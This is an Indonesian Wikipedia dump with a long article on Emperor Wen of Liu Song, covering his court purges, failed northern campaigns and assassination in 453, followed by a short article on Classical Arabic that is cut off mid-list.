Pada 29 tahun di masa pemerintahannya, Kaisar Wen melanjutkan rencana besar ayahandanya dan beberapa kebijakan wilayah Dinasti Jin. Periode itu disebut "administrasi Yuanjia" (元嘉之治), dianggap sebagai masa kemakmuran dan berkuasa, karena ketekunan dan kemampuan kaisar di dalam menemukan pejabat yang cakap dan jujur untuk bekerja di dalam pemerintahannya. Namun Kaisar Wen berulang-ulang gagal menyerang saingannya Wei Utara karena menggunakan strategi yang salah yang melemahkan negaranya sampai di akhir masa pemerintahannya. Pada tahun 453, kaisar yang marah atas putra mahkotanya Liu Shao yang memakai guna-guna untuk mengutuknya, ia berencana untuk memecat Liu Shao; ketika rencana tersebut terbongkar, Liu Shao merencakana sebuah kudeta dengan membunuh dan merampas kekuasaanya, namun kurang dari setahun berkuasa adik Liu Shao, Liu Jun mengalahkannya dan naik taktha sebagai Kaisar Xiaowu.

Liu Yilong lahir di Jingkou (京口, modern Zhenjiang, Jiangsu) pada tahun 407. Orangtuanya adalah Liu Yu dan selirnya Hu Dao'an (胡道安), sebagai putra ketiga Liu Yu; Pada saat itu, Liu Yu telah menjadi seorang jenderal terkenal di Jin, dan Liu Yilong lahir di dalam sebuah keluarga yang kaya raya dan berkuasa. Dengan alasan yang tidak diketahui, pada tahun 409, Liu Yu menghukum mati Selir Hu. Nenek ibunda Liu Yilong Nyonya Su terlibat di dalam sebuah pemberontakan dan ia dekat dengannya ketika ia beranjak dewasa. Pada tahun 410, ketika ibu kota Jin Jiankang diserang oleh Laksamana Lu Xun (盧循), Liu Yu memerintahkan Liu Cui (劉粹) untuk menemani Liu Yilong yang berusia tiga tahun untuk mempertahankan Jingkou. Pada tahun 415, ia dijadikan Adipati Pengcheng. Pada tahun 417 ketika Liu Yu menyerang Yao Qin, ia lagi-lagi membuat Liu Yilong ditemani oleh pejabatnya tinggal di Pengcheng untuk bekerja sebagai gubernur Provinsi Xu (徐州, modern Jiangsu utara dan Anhui). Pada tahun 418, setelah Liu Yu menguasai Yao Qin, Liu Yilong diangkat sebagai gubernur Provinsi Jing (荊州, modern Hubei dan Hunan), dan komandan pasukan kekaisaran barat. Beberapa pejabatnya termasuk Dao Yanzhi (到彥之), Zhang Shao (張邵), Wang Tanshou (王曇首), Wang Hua (王華), dan Shen Linzi (沈林子), dengan Zhang yang sebenarnya bertugas di markas-markas karena usia Liu Yilong yang masih belia. Setelah Liu Yu merampas taktha Jin pada tahun 420, mendirikan Liu Song (sebagai Kaisar Wu), ia menjadikan sejumlah putra-putranya pangeran, dan Liu Yilong dijadikan Pangeran Yidu pada saat itu. Pada saat itu, ia rajin mempelajari Karya Klasik Tiongkok dan sejarah-sejarahnya, dan juga Kaligrafi.

Pada tahun 424 dipercaya kakanda Liu Yilong Kaisar Shao (menggantikan Kaisar Wu yang meninggal pada tahun 422) tidak pantas menjadi kaisar, para pejabat tinggi Xu Xianzhi, Fu Liang, dan Xie Hui memecat dan membunuhnya, dan juga beberapa saudara Liu Yilong lainnya seperti Liu Yizhen (劉義真) Pangeran Luling, yang beranggapan bahwa Liu Yizhen lebih tidak pantas bertakhta daripada Kaisar Shao. Menganggap Liu Yilong mampu dan cakap, mereka memberikan taktha kepada Liu Yilong dengan Fu secara pribadi tiba dengan pejabat-pejabat lainnya di markas-markas Liu Yilong di Jiangling. Rekan-rekan Liu Yilong yang mendengar kematian Kaisar Shao dan Liu Yizhen curiga dan menyarankannya untuk tidak menuju timur ke ibu kota Jiankang untuk menerima takhta. Namun Wang Hua menunjukkan bahwa pemimpin kudeta berada di dalam kepemimpinan kolektif dan keseimbangan kekuasaan memastikan bahwa mereka tidak dapat berkhianat. Wang Tanshou dan Dao juga setuju, dan Liu Yilong memutuskan untuk menerima takhta. Ia naik taktha kemudian pada tahun itu sebagai Kaisar Wen.

Awalnya Kaisar Wen ditenangkan para pejabat tinggi yang terlibat di dalam pemecatan Kaisar Shao (termasuk tidak hanya Xu Xianzhi, Fu Liang, Xie Hui, namun juga saudara Wang Tanshou Wang Hong dan Tan Daoji) dengan meninggalkan mereka di dalam kekuasaan dan kemudian memberikan mereka jabatan yang lebih tinggi lagi. Memang awalnya ia meninggalkan sebagai urusan negara di tangan Xu dan Fu, namun secara bertahap melibatkan dirinya kedalam hal-hal tersebut. Ia juga mengisyaratkan ketidaksetujuannya dari tindakan mereka yang memanggil istri-istri dan ibunda-ibunda Kaisar Shao dan Liu Yizhen ke ibu kota dan memperlakukan mereka dengan hormat. Ia menghormati anumerta ibunda selirnya Hu sebagai seorang Ibusuri, dan mengangkat istrinya Putri Yuan Qigui sebagai seorang permaisuri.

Pada tahun 425, Xu dan Fu meundurkan diri dan Kaisar Wen menyetujuinya dan mulai menangani hal-hal penting seorang diri. Namun keponakan Xu, Xu Peizhi (徐佩之) dan rekan-rekannya Cheng dan Wang Shaozhi (王韶之) meyakinkannya bahwa ia tidak perlu mengundurkan diri yang kemudian ia kembali ke jabatannya semula. (Meskipun tidak jelas dinyatakan di dalam sejarah yang ternyata Fu kemudian melakukannya juga.) Namun Kaisar Wen tidak suka bahwa Xu, Fu, dan Xie membunuh kedua kakandanya, dan pada akhir tahun 425 berencana untuk menghancurkan mereka dengan menghasut Wang Hua dan Jenderal Kong Ningzi (孔寧子). Ia kemudian mengerahkan pasukan dan secara terang-terangan menyatakan bahwa ia akan menyerang saingannya Wei Utara, akan tetapi mempersiapkan untuk menangkap Xu dan Fu yang pada saat itu terlibat di dalam kampanye militer melawan Xie, yang pada saat itu gubernur Provinsi Jing. Pada musim semi tahun 426, rumor membocorkan rencana tersebut, sehingga Xie mulai mempersiapkan pasukan untuk melawan. Segera setelah Kaisar Wen mengeluarkan perintah agar Xu, Fu, dan Xie ditahan dan dibunuh, dan juga memerintahkan sebuah dekret terpisah yang memanggil Xu dan Fu ke istana.

Percaya bahwa Wang Hong dan Tan awalnya tidak terlibat di dalam rencana melawan Kaisar Shao, ia memanggil mereka ke ibu kota dan menempatkan Tan bertanggung jawab atas pasukan melawan Xie dan Wang Hong bertanggung jawab di pemerintahan kekaisaran. Sementara itu, Xie Hui berkabung Xu dan Fu dan menyatakan bahwa semua yang mereka lakukan adalah untuk kekaisaran dan menyalahkan Wang Hong, Wang Tanshou, dan Wang Hua atas tuduhan palsu mereka, dan menuntut agar mereka dieksekusi. Xie Hui memiliki pasukan yang kuat dan beranggapan bahwa beberapa gubernur provinsi lainnya akan bergabung dengannya, namun mereka menolaknya. Ia awalnya mampu mengalahkan pasukan Dao, namun Tan tiba tak lama kemudian, dan Xie, yang takut dengan Tan, tidak tahu apa yang harus dilakukan. Tan dengan cepat menyerangnya dan mengalahkan pasukannya, dan Xie kabur ke Jiangling, dan kemudian kabur dengan saudaranya Xie Dun (謝遯), namun Xie Dun begitu berat sehingga ia tidak bisa berkuda dan memperlambat perjalanan mereka sehingga dapat tertangkap dengan mudah. Ia kemudian dikirim ke Jiankang dan dieksekusi dengan Xie Jiao dan Xie Dun, bersama dengan seluruh keponakannya dan rekan-rekannya, meskipun banyak dari rekannya yang diampuni.

Kaisar Wen segera menjadi terkenal karena kecakapannya di dalam mengatur negara serta peduli dengan kesejahteraan rakyat. Ia membuat sistem di mana para pejabat baik di ibu kota dan provinsi diberikan masa kerja yang relatif lama namun dipantau dengan cermat atas kemajuan mereka. Ia sangat memperhatikan kemampuan saudara-saudaranya di dalam memerintah dan memberikan banyak saran dan dukungan. Salah satu dari mereka, Liu Yikang Pangeran Pengcheng, yang segera menjadi terkenal atas kecakapannya bertugas di Provinsi Jing setelah menggantikan Xie, dan pada tahun 428, Wang Hong, yang takut karena telah menjabat sebagai perdana menteri terlalu lama, mengundurkan diri dan memberikan kekuasaanya kepada Liu Yikang. Kaisar Wen menolaknya namun memindahkan sebagian besar otoritas Wang Hong kepada Liu Yikang pada tahun 429. Juga pada tahun 429, Kaisar Wen mangangkat putra sulungnya dengan Permaisuri Yuan, Liu Shao, Putra Mahkota. Pada tahun itu nenek ibunda Kaisar Wen Nyonya Su meninggal dan ia sangat berkabung karenannya dan berkeinginan untuk memberikan nama kehormatan untuknya namun karena tentangan pejabat tinggi Yin Jingren (殷景仁), ia tidak jadi melakukannya.

Pada sekitar tahun itu, Kaisar Wen juga mulai mempersiapkan sebuah kampanye melawan saingannya Wei Utara yang berusaha untuk memulihkan beberapa provinsi yang dirampas oleh Wei Utara selama masa pemerintahan Kaisar Shao. Pada musim semi tahun 430, Dao Yanzhi diperintahkan untuk mengerahkan 50,000 pasukan untuk menyerang Wei Utara. Kaisar Taiwu ketika diinformasikan oleh utusan bahwa Kaisar Wen berniat untuk memulihkan provinsi selatan Sungai Kuning, yang marah bahwa ia akan mundur dan kembali pada musim dingin ketika Sungai Kuning membeku, dan yang pada awalnya menarik pasukannya ke selatan Sungai Kuning ke utara, yang memungkinkan pemulihan empat kota utama Luoyang, Hulao, Huatai (滑台, modern Anyang, Hunan), dan Qiao'ao (碻磝, modern Liaocheng, Shandong) tanpa peperangan. Daripada maju lebih jauh ke utara melawan Wei Utara, Kaisar Wen berhenti dan menyebarkan pasukannya untuk memperkuat pertahanannya, meskipun ia telah memasuki kesepakatan dengan kaisar Helian Ding dari Xia untuk menguasai dan membagi Wei Utara. Dengan ketidakaktifan pasukan Kaisar Wen, Kaisar Taiwu dapat menyerang Helian Ding dan memporak porandakan Xia (yang akhirnya menghancurkannya pada tahun 431), dan jenderal-jenderal lainnya, bahkan ketika Kaisar Taiwu absen, mempersiapkan serangan balasan. Pada musim dingin tahun 430, Jenderal Kaisar Wen Du Ji (杜驥), tidak dapat mempertahankan Luoyang yang lalu mengabaikannya. Hulao juga jatuh. Setelah mendengar kabar itu, Dao mundur dan meninggalkan Jenderal Zhu Xiuzhi (朱脩之) membela Huatai sendirian. Pada musim semi tahun 431, Kaisar Wen mengirim Tan ke utara untuk mencoba membebaskan Zhu di Huatai, namun dengan pasukan Wei Utara memutuskan rute pasokan Tan, Tan tidak dapat mencapai Huatai dan terpaksa mundur juga. Zhu yang tidak mendapat dukungan segera tertangkap ketika Huatai jatuh. Upaya pertama Kaisar Wen untuk mendapatkan kembali provinsi-provinsi selatan Sungai Kuning berakhir dengan kegagalan.

Pada tahun 432, Wang Hong meninggal dan Liu Yikang pada saat itu menjabat sebagai perdana menteri.

Juga pada tahun 432 tidak suka pada pemerintahan Liu Daoji (劉道濟) gubernur Provinsi Yi (益州, modern Sichuan dan Chongqing), rakyat Provinsi Yi memberontak di bawah pimpinan Xu Muzhi (許穆之), yang mengganti namanya menjadi Sima Feilong (司馬飛龍) dan mengaku sebagai keturunan keluarga kekaisaran Jin. Liu dengan cepat mengalahkan dan membunuh Sima Feilong, namun seorang biarawan Buddha yang bernama Cheng Daoyang (程道養) segera naik takhta dan mengaku sebagai Sima Feilong yang asli dan mengancam Chengdu ibu kota Provinsi Yi, dan jenderal Pei Fangming (裴方明) dapat memadamkan pemberontakan tersebut, Cheng tetap tinggal sebagai ancaman selama beberapa tahun, bergelar Pangeran Shu. Ketika kampanye berlangsung, Yang Nandang (楊難當) pemimpin Chouchi, yang telah menjadi vasal Liu Song dan Wei Utara juga menyerang dan menguasai Provinsi Liang (梁州, modern Shaanxi selatan) tahun 433.

Pada musim semi tahun 434, jenderal Kaisar Wen Xiao Sihua (蕭思話) dapat mengalahkan pasukan Yang Nandang dan merampas Provinsi Liang. Yang Nandang segera memohon ampun, dan karena ia tidak ingin kehilangan sekutunya yang berpengaruh melawan Wei Utara, Kaisar Wen mengampuninya.

Pada tahun 435, Feng Hong Kaisar Yan Utara, di bawah serangan bertubi-tubi Wei Utara menawarkan untuk menjadi vasal Liu Song mencoba untuk mendapatkan bantuan, dan Kaisar Wen menjadikan Feng Hong sebagai Pangeran Yan. Namun Kaisar Wen tidak dapat sungguh-sungguh memberikan bantuan, dan Feng Hong melarikan diri ke Goguryeo pada tahun 436.

Pada saat itu, sebuah pertarungan politik yang berat mulai berkembang di dalam pemerintahan Kaisar Wen. Kecemburuan akan jabatan yang dianugerahkan Kaisar Wen untuk Yin Jingren, Liu Zhan (劉湛) menjadi cobaan untuk mencemarkan nama baik Yin Jingren, dan ia mencoba mengambil hati Liu Yikang untuk menggunakan kekuasaan perdana menteri untuk mengusir Yin dari pemerintahan. Yin yang tidak ingin berselisih dengan Liu Zhan, mengundurkan diri dengan alasan sakit, dan ketika Kaisar Wen menolaknya, ia mengizinkan Yin untuk cuti sakit. Namun pemerintahan kekaisaran jadi terbagi fraksi Liu Zhan dan Liu Yikang dan anti fraksi Liu Yikang.

Pada tahun 436, Kaisar Wen sakit berat. Di dalam sakitnya, Liu Zhan membujuk Liu Yikang bahwa jika Kaisar Wen meninggal, tidak ada seorangpun yang dapat mengendalikanb Tan Daoji, dan kemudian memanggil Tan ke ibu kota dari markasnya ke Provinsi Jiang (江州, modern Jiangxi dan Fujian). Setelah Tan tiba di Jiankang, Kaisar Wen sembuh dari sakitnya dan siap mengembalikan Tan ke markasnya, ketika tiba-tiba ia jatuh sakit lagi. Pada saat itu, Tan telah berada di dermaga siap untuk berangkat ke Provinsi Jiang, dan Liu Yikang memanggilnya kembali ke Jiankang dan menangkapnya. Kaisar Wen kemudian mengeluarkan dekret palsu yang menuduh Tan merencanakan pemberontakan dan mengeksekusinya bersama dengan putra-putranya namun mengampuni cucu-cucunya. (Ketika Tan ditahan, ia dengan marah membuang syalnya ketanah dan berucap, "Anda telah menghancurkan Tembok Besar Tiongkok." Ketika pejabat-pejabat Wei Utara mendengar kematian Tan, mereka bergembira. Akun tradisional muncul yang meminimalkan keterlibatan Kaisar Wen atas kematian Tan, namun kejadian-kejadian terakhir yang muncul menunjukkan bahwa Liu Yikang bertindak dengan persetujuan penuh Kaisar Wen dalam hal ini.)

Pada musim semi tahun 437, Kaisar Wen dengan serius mempertimbangkan proposal yang telah dibuat Tuoba Tao, awalnya pada tahun 431 dan kemudian pada tahun 433, bahwa kedua klan kekaisaran memasuki hubungan kekeluargaan melalui pernikahan salah satu putrinya dengan pangeran mahkota Tuoba Tao Tuoba Huang, dan ia mengirimkan pejabatnya Liu Xibo (劉熙伯) ke Wei Utara untuk menegosiasikan syarat-syarat pernikahan tersebut. Namun tak lama kemudian putri yang akan dinikahkan dengan Tuoba Huang meninggal dan proposal itu turut berakhir dengan kematiannya.

Kemudian pada tahun 437, pemberontak lama Cheng Daoyang Pangeran Shu akhirnya tertangkap dan terbunuh yang mengakhiri tujuh tahun pemberontakan.

Pada tahun 438, Kaisar Wen membangun sebuah universitas untuk mendukung para pelajar mempelajari karya-karya terkenal. Ia membangun empat disiplin di dalam universitasnya:


Perhatian Kaisar Wen pada kecakapan pejabat kekaisaran dapat terlihat sebagian pada tahun 439, ketika menurut sebuah dekret yang ditinggalkan Kaisar Wu bahwa putra-putranya bekerja sebagai gubernur Provinsi Jing dirotasikan menurut usia, ia seharusnya menjadikan saudaranya Liu Yixuan (劉義宣) sebagai Pangeran Nanqiao gubernur Provinsi Jing. Namun karena ia menganggap bahwa Liu Yixuan tidak kompeten, ia memberikan jabatan tersebut kepada saudaranya yang lebih cakap Liu Yiji (劉義季) Pangeran Hengyang, gubernur Provinsi Jing. (Beberapa tahun kemudian, setelah kematian Liu Yiji dan atas bujukan kakak perempuannya Liu Xingdi (劉興弟) Putri Kuaiji, ia akhirnya mengangkat Liu Yixuan sebagai gubernur Provinsi Jing, namun hanya setelah memberikan banyak saran tentang pengaturan provinsi dengan beanr.)

Akan tetapi pada tahun 440, Liu Yikang, yang menjadi bagian utama dari keberhasilan pemerintahan Kaisar Wen karena ketekunan dan kemampuannya, yang menjadi begitu tersanjung oleh Liu Zhan yang tidak dapat membedakan antara dirinya sebagai bawahan dan kaisar. Ketika Kaisar Wen jatuh sakit kembali, rekan-rekan Liu Zhan dan Liu Yikang, Liu Bin (劉斌), Wang Lü (王履), Liu Jingwen (劉敬文), dan Kong Yinxiu (孔胤秀) diam-diam merencanakan agar Liu Yikang menggantikan Kaisar Wen, yang berlawanan dengan wasiat Kaisar Wen yang menginginkan Putra Mahkota Shao menjadi kaisar dan Liu Yikang menjadi pemangku takhta raja. Ketia Kaisar Wen sembuh, ia mulai mencurigai Liu Yikang mencoba untuk merebut mahkotanya. Pada musim dingin tahun 440 ia memenjarakan Liu Yikang dirumahnya, menahan dan mengeksekusi Liu Zhan dan sejumlah rekan-rekan Liu Yikang. Ia kemudian memecat Liu Yikang dari jabatannya sebagai perdana menteri dan mengangkatnya sebagai gubernur Provinsi Jiang, dan mengembalikan kekuasaan Yin Jingren. Ia menggantikan Liu Yikang dengan saudaranya yang lebih muda, Liu Yigong (劉義恭) Pangeran Jiangxia, namun Liu Yigong, yang menyadari bahaya di dalam memegang kekuasaan terlalu banyak, tidak melibatkan dirinya ke dalam pengambilan keputusan yang sebenarnya. Kemudian pada tahun itu, Yin Jingren meninggal dan tanggung jawab penting jadi terbagi di antara beberapa pejabat.

Pada tahun 441, Yang Nandang, tidak mau menyerahkan kekuasaannya di Provinsi Liang dan Yi menyerang Liu Song. Kaisar Wen mengirim Pei Fangming dan jenderal lainnya Liu Zhendao (劉真道), untuk menyerang Chouchi, dan satu-satunya contoh di mana pasukan dinasti selatan menduduki Chouchi, mengambil alih pada tahun 442 yang memaksa Yang Nandang melarikan diri ke Wei Utara. Namun pada tahun 443, Chouchi jatuh ke tangan pasukan Wei Utara, Pei dan Liu Zhendao dieksekusi karena telah menggelapkan harta negara dan kuda-kuda dari Chouchi selama pengerahan militer dalam jumlah besar dari tahun 441 dan 442.

Pada tahun 445, di dalam sebuah peristiwa terkenal ketika menunggu mengirim saudaranya Liu Yiji ke markas barunya sebagai gubernur Provinsi Yan Selatan (南兗州, modern Jiangsu pusat), Kaisar Wen memerintahkan putra-putranya untuk tidak makan sampai makan malam dipersiapkan di dalam upacara, namun dengan sengaja telat mempersiapkannya, sehingga putra-putranya akan menderita kelaparan, dan kemudian memberitahu mereka, "Kalian dibesarkan di dalam rumah tangga yang kaya raya dan tidak melihat rakyat yang menderita kemiskinan. Saya ingin kalian mengerti akan derita kelaparan agar kalian belajar berhemat dan memperhatikan rakyat." Namun sementara kejadian umum ini mendapat pujian dari sejarawan termasuk Pei Ziye (裴子野), komentator "Song Shu", merasa kemunafikan yang menempatkan para pangeran di jabatan-jabatan tinggi pada usia muda tanpa pelatihan yang tepat.

Setelah pesta itu, sebuah rencana yang melibatkan pejabat Fan Ye terbongkar yang diduga bahwa Fan berkomplot dengan keponakannya Xie Zong (謝綜) dan memecat rekan perdana menteri Li Yikang, Kong Xixian (孔熙先) untuk membunuh Kaisar Wen di dalam pesta untuk Liu Yiji dan menjadikan Liu Yikang sebagai kaisar. Salah satu dedengkotnya, keponakan Kaisar Wen Xu Danzhi (徐湛之), setelah rencana pembunuhan gagal di dalam pesta, mengabarkan komplotannya, dan selain Xu, seluruh konspirator dieksekusi. (Sejarawan Wang Mingsheng (王鳴盛) beranggapan komplotan itu terlalu mengada-ada, dan beranggapan sebaliknya bahwa Fan telah menjadi korban dari tuduhan palsu oleh Xu, Yu Bingzhi (庾炳之), dan He Shangzhi.) Akibat dari peristiwa itu, Liu Yikang, dipecat dari gelarnya dan diturunkan ke peringkat biasa dan menjadi tahanan rumah. (Tidak ada rencana-rencana lainnya untuk menempatkan Liu Yikang di atas takhta, dan pada tahun 451, yang khawatir rencana tersebut akan terulang kembali di tengah invasi Wei Utara, Kaisar Wen akan melanggar janji-janji yang dibuat dengan kakak perempuannya Liu Xingdi Putri Kuaiji, membunuh Liu Yikang.)

Pada tahun 446, ketika Wei Utara menghadapi pemberontakan dari Gai Wu (蓋吳) suku Xiongnu, Kaisar Wen menugaskan Gai sebagai adipati dan jenderal, meskipun ia tidak memberi dukungan militer sebenarnya untuk Gai. Akan tetapi hal ini membuat marah Kaisar Taiwu dari Wei Utara, dan setelah Kaisar Taiwu meredakan pemberontakan Gai, hubungan di antara kedua negara memburuk, terutama dengan serangan mengerikan pasukan Wei Utara yang dilakukan terhadap pasukan Liu Song di Provinsi Qing (青州, modern pusat dan Shandong) timur, Ji (冀州, modern Shandong barat laut), dan Yan (兗州, modern Shandong barat) kemudian pada tahun itu.

Pada tahun 449, Kaisar Wen mempersiapkan kampanye kedua untuk merebut provinsi selatan Sungai Kuning, dan banyak jenderal dan pejabat membalas dengan rencana-rencana perang, dan jenderal Wang Xuanmo (王玄謨) mengajukan rencana yang disukai Kaisar Wen. Di dalam persiapan, Kaisar Wen memindahkan pasukan yang ditempatkan dan perbekalan di provinsi internal ke provinsi perbatasan. Namun sebelum ia dapat memulai kampanye tersebut, Tuoba Tao menyerang duluan pada musim semi tahun 450, dan membuat Xuanhu (懸瓠, di modern Zhumadian, Henan) diduduki selama 42 hari, dan setelah mengalami banyak kekalahan dikedua belah pihak, Tuoba Tao mundur tanpa menangkap Xuanhu. Hal ini membuat Kaisar Wen percaya bahwa kekuatan militer Wei Utara memudar, dan ia memutuskan untuk melancarkan serangan pada akhir tahun 450, meskipun jenderal Liu Kangzu (劉康祖) menentang yang percaya bahwa kampanye harus dimulai pada musim semi tahun 451, Shen Qingzhi (沈慶之), yang berpendapat bahwa Liu Song tidak berada di dalam posisi siap berperang melawan Wei Utara, Xiao Sihua, dan Pangeran Mahkota Shao.

Pasukan Liu Song di bawah pimpinan Xiao Bin (蕭斌) dan Wang Xuanmo dengan cepat mengambil Qiao'ao dan Le'an (樂安, modern Tangshan, Hebei), karena pasukan Wei Utara secepatnya mengabaikan kedua kota itu, dan kemudian menduduki Huatai. Rakyat Han disekitar Huatai awalnya dengan senang hati mendukung kampanye Liu Song, namun Wang memerintahkan mereka untuk menyerahkan sejumlah besar buah pir, yang menyebabkan mereka marah dan berbalik melawan Liu Song. Pasukan Liu Song sebaliknya tidak dapat dengan mudah menangkap Huatai, dan pada musim dingin tahun 450, Kaisar Taiwu menyeberangi Sungai Kuning dan pasukan Wang jatuh, memaksanya melarikan diri ke Qiao'ao. Xiao dianggap membela Qiao'ao melawan serangan Wei Utara, namun Shen membujuknya bahwa tindakannya itu sia-sia belaka, dan meskipun perintah dari Kaisar Wen untuk membela Qiao'ao, Xiao memimpin pasukan utama kembali ke Licheng (歷城, di modern Ji'nan, Shandong) untuk melestarikan kekuatan pasukannya. Sementara itu, karena kekalahan Wang di Huatai, meskipun jenderal Liu Wenjing (柳文景) mampu menangkap Tong Pass di barat dan mengancam wilayah Wei Utara Guanzhong, Kaisar Wen memilih untuk memanggil kembali Liu dan juga mengabaikan barat.

Sebagai balasan atas serangan Liu Song, Kaisar Taiwu melancarkan serangan melawan provinsi utara Liu Song. Keponakan Tuoba Tao, Tuoba Ren (拓拔仁) dengan cepat menangkap Xuanhu dan Xiangcheng (項城, modern Zhoukou, Henan) dan sampai dengan Shouyang. Tuoba Tao sendiri maju sampai ke Pengcheng namun tidak menempatkan kota yang dijaga ketat tersebut di bawah pengepungan; namun ia maju ke selatan menyatakan bahwa ia akan menyeberangi Sungai Yangtze dan menghancurkan ibu kota Liu Song, Jiankang. Baik kedua pasukan utama dan pasukan cabang lain yang dikirimkannya membantai dan menjarah habis-habisan membuat wilayah Liu Song Sungai Huai hancur. Pada tahun baru 451, Tuoba Tao mencapai Guabu (瓜步, modern Nanjing, Jiangsu), menyeberangi sungai dari Jiankang namun pada titik ini ia mengajukan kembali proposal pernikahan yang dibuat seperti sebelumnya bahwa jika Kaisar Wen menikahkan putrinya kepada salah satu cucunya, ia akan menikahkan seorang putri dengan putra Kaisar Wen, Liu Jun (yang saat itu membela Pengcheng), untuk membangun perdamaian jangka panjang. Putra Mahkota Shao menyukai proposal tersebut namun Jiang Dan (江湛) menentangnya, dan proposal pernikahan itu tidak diterima. Pada musim semi tahun 451, khawatir pasukannya akan kewalahan terhadap serangan belakang pasukan Liu Song diasramakan di Pengcheng dan Shouyang, Tuoba Tao mulai menarik diri dan diperjalanan ia dihina oleh jenderal Liu Song, Zang Zhi (臧質), ia menduduki Xuyi (盱眙, modern Huai'an, Jiangsu), dan keduanya mengalami kerugian berat. Kampanye ini tampaknya sangat mempengaruhi kedua kekaisaran dan menunjukkan bagian-bagian yang kejam dari kepribadian Tuoba Tao seperti yang digambarkan oleh Sima Guang.

Sejarawan lainnya, Shen Yue menyatakan bahwa Kaisar Wen memodeli rencana militernya pada orang-orang Kaisar Guangwu, namun tidak memiliki kemampuan komando militer Kaisar Guangwu, oleh karena itu tidak dapat menyusun rencana militer yang tepat seperti yang dilakukan oleh Kaisar Guangwu.

Pada tahun 452, setelah mendengar kabar bahwa Tuoba Tao telah tewas dibunuh oleh kasim Zong Ai, Kaisar Wen mempersiapkan kampanye lain yang dipimpin oleh Xiao Xihua. Setelah jenderal umum Xiao Zhang Yong (張永) dikalahkan di Qiao'ao ia mengabaikan kampanye tersebut.

Sementara itu meskipun Kaisar Wen sendiri menghadapi krisis di dalam istananya. Diketahui bahwa Putra Mahkota Shao dan putra lain Kaisar Wen, Liu Jun Pangeran Shixing menggunakan jasa penyihir Yan Daoyu (嚴道育) untuk mengguna-gunai Kaisar Wen sampai mati sehingga Putra Mahkota Shao dapat menjadi Kaisar. Kaisar Wen yang memergoki hanya menegur putra-putranya namun tidak bertindak lebih lanjut untuk menghukum mereka. Namun pada tahun 453, Kaisar Wen yang berharap putra-putranya dapat berubah setelah kejadian itu memergoki bahwa mereka masih tetap berhubungan dengan Yan bahkan setelah ditegor. Ia kemudian berunding dengan para pejabat tingginya Xu Danzhi, Jiang Dan, dan Wang Sengchuo (王僧綽) mengenai rencananya untuk memecat putra mahkota Shao dan memerintahkan Liu Jun untuk bunuh diri. Namun ia membuat kesalahan dengan menceritakan rencana-rencananya dengan ibunda Liu Jun, Selir Pan, dan Selir Pan dengan cepat memberitahu Liu Jun, yang kemudian memberitahukan Putra Mahkota Shao. Pada musim semi tahun 453, Putra Mahkota Shao memberontak, mengirim pasukan pribadinya untuk mengamankan istana dan mengirim rekan dekatnya Zhang Chaozhi (張超之) kedalam istana untuk membunuh Kaisar Wen. Ketika Zhang memasuki kamar tidur Kaisar Wen dengan sebuah pedang, pengawal Kaisar Wen sedang tidur, dan Kaisar Wen mecoba untuk menahan serangan Zhang dengan sebuah meja kecil. Serangan pertama Zhang memotong jari-jari Kaisar Wen, dan serangan yang kedua membunuh Kaisar Wen. Setelah beberapa pertimbangan, Liu Shao juga membunuh Xu dan Jiang dan kemudian memfitnah bahwa Xu dan Jiang telah membunuh Kaisar Wen; ia kemudian naik takhta, meskipun kemudian pada tahun itu ia dikalahkan dan dibunuh oleh saudaranya yang lain, Kaisar Xiaowu Pangeran Wuling (karakter yang berbeda dari Liu Jun yang menjadi konfederasi Liu Shao), yang naik takhta sebagai Kaisar Xiaowu.

Liu Shao awalnya memberikan ayahandanya Nama Anumerta Kaisar Jing (景帝) dengan Nama Kuil Zhongzong (中宗). Setelah Kaisar Xiaowu naik takhta, ia mengganti nama anumerta Kaisar Wen dan nama kuil Taizu (太祖).





</doc>
<doc id="1753372" url="https://id.wikipedia.org/wiki?curid=1753372" title="Bahasa Arab Klasik">
Bahasa Arab Klasik

Bahasa Arab Klasik (), juga disebut bahasa Arab Al-Qur'an, adalah suatu bentuk bahasa Arab yang digunakan dalam naskah sastra dari masa Umayyah dan Abbasiyah (abad ke-7 hingga ke-9). Ia berdasarkan pada dialek suku-suku Arab abad pertengahan. () adalah turunan langsungnya yang saat ini digunakan di dunia Arab untuk penulisan dan percakapan resmi, misalnya dalam pidato, siaran radio, dan konten non hiburan. Meskipun kosakata dan gaya bahasa pada bahasa Arab Modern berbeda dengan bahasa Arab Klasik, dalam hal morfologi dan sintaks pada dasarnya tidak berubah; struktur sintaks yang digunakan hanya sebagian saja ("subset") dari yang tersedia pada bahasa Arab Klasik. Namun, dalam penggunaan bahasa sehari-hari terjadi perubahan yang lebih dramatis. Di dunia Arab, antara bahasa Arab Klasik dan bahasa Arab Modern tidak terlalu dibedakan; keduanya disebut sebagai al-fuṣḥá (الفصحى‎), yang artinya 'bahasa Arab yang paling fasih'.

Karena Al-Qur'an ditulis dalam bahasa Arab Klasik, maka bahasa tersebut oleh mayoritas Muslim dipandang sebagai suci.

Bahasa Arab Klasik bersumber pada bagian tengah dan utara Jazirah Arab, dan berbeda dari bahasa-bahasa Arab Selatan Kuno yang dipertuturkan di bagian selatan jazirah itu, yang saat ini adalah Yaman. Bahasa Arab Klasik berkembang bersama-sama bahasa-bahasa Arab Utara Kuno lainnya. Pada abad ke-5 SM, Herodotus ("Historia" I,131; III,8) mengutip julukan seorang dewi dalam bentuk bahasa Arab pra-klasiknya, yaitu "Alilat" (Ἀλιλάτ, i. e.,ʼal-ʼilat), yang ditafsirkan sebagai "sang dewi". Selain dari bentuk terpisah nama dewi tersebut, bahasa Arab pertama kali ditemukan dalam sebuah prasasti di Qaryat al-Fāw (dahulu bernama Qaryat Dhat Kahil, dekat Sulayyil, Arab Saudi) dari abad ke-1 SM. Prasasti tertua dalam bahasa Arab Klasik adalah dari 328 M dan dikenal dengan nama prasasti Namārah, yang ditulis dalam abjad Nabathea dan dinamakan sesuai tempat penemuannya di Suriah selatan pada April 1901.

Seiring penyebaran Islam, bahasa Arab Klasik menjadi bahasa yang penting dalam bidang ilmu pengetahuan dan pendidikan agama sebab merupakan bahasa dari Al-Qur'an; bahkan pada beberapa kesempatan penyebaran bahasa lebih cepat daripada agamanya.

Tata bahasa deskriptif bahasa Arab (قواعد‎ "qawāʻid", 'kaidah') telah mengalami perkembangan pada akhir 700-an. Ahli tata bahasa Arab terawal yang diketahui adalah ʻAbd Allāh ibn Abī Isḥāq. Hasil upaya dari para ahli tata bahasa selama tiga generasi terangkum dalam karya ulama Persia Sībawayhi. Upaya mutakhir dalam menganotasi keseluruhan tata bahasa Arab dalam Al-Qur'an dengan menggunakan sintaks tradisional, misalnya sbb.:




</doc>
